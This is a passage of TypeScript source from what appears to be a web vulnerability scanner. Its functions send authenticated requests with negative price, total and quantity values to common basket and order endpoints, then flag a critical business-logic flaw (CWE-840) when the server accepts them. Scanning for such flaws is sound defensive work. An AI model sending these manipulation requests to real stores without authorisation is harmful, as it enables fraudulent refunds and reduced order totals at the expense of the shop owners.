        if (accepted) {
          findings.push({
            type: "business-logic-negative-quantity",
            severity: "CRITICAL",
            url,
            parameter: field,
            evidence:
              `Business Logic vulnerability: Negative quantity manipulation confirmed at ${url}. ` +
              `Sending \`${field}: -1\` was accepted by the server (HTTP ${resp?.status}). ` +
              `An attacker could exploit this to receive refunds, reduce order totals, or gain credits.`,
            cvssScore: 9.1,
            cveId: "CWE-840",
            isVerified: true,
            confidence: CONFIDENCE.EXEC_VERIFIED,
            validationSteps: [
              `POST ${url} with { ${field}: -1 } — server returned HTTP ${resp?.status}`,
              `Response JSON accepted the negative ${field} value or contained a success/ID field`,
            ],
          });
          break outer; // One confirmed finding per target is sufficient
        }
      } catch { /* next variant */ }
    }
  }

  return findings;
}

export async function probeBusinessLogicVulnerabilities(
  baseUrl: string,
  session: AuthSession
): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];

  const priceEndpoints = ["/api/basket", "/api/cart", "/api/orders", "/rest/basket", "/api/v1/basket"];
  for (const path of priceEndpoints) {
    try {
      const url = new URL(path, baseUrl).toString();
      const negativePriceBody = { productId: 1, quantity: 1, price: -100, total: -100 };

      const resp = await authedFetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(negativePriceBody),
      }, 6000, false, session);

      const json = await isSuccessfulJsonResponse(resp);
      if (json && (json.price === -100 || json.total === -100 || json.status === "success" || json.id)) {
        findings.push({
          type: "business-logic-price-manipulation",
          severity: "CRITICAL",
          url,
          parameter: "price",
          evidence: `Business Logic vulnerability: Negative price manipulation confirmed. The endpoint accepted price (-100).`,
          cvssScore: 9.1,
          cveId: "CWE-840",
          isVerified: true,
          confidence: CONFIDENCE.EXEC_VERIFIED,
        });
        break;
      }
    } catch { /* next */ }
  }

  // Probe for negative quantity manipulation (e.g. quantity=-1)
  const quantityFindings = await probeNegativeQuantity(baseUrl, session);
  findings.push(...quantityFindings);

  return findings;
}
